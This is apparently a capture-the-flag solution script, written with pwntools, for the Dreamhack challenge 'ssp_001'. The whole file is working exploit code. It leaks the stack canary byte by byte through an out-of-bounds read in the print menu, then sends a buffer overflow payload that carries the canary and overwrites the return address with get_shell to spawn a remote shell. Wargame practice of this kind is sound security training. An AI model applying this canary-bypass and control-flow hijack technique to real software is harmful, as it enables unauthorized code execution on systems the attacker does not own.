from pwn import *

#p = process("./ssp_001")
p = remote('host3.dreamhack.games', 17332)
elf = ELF("./ssp_001")

canary = []
for i in range(8):
    p.sendlineafter(b"> ", b"P")
    p.sendlineafter(b"Element index : ", str(i + 0x80).encode())

    p.recvuntil(b"is : ")
    val = int(p.recvline(), 16)

    canary.append(val)

canary = bytes(canary)

payload = b'A'*0x40 + canary + p32(0) + p32(elf.symbols["get_shell"])

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', str(len(payload)).encode())
p.sendafter(b'Name : ', payload)

p.interactive()
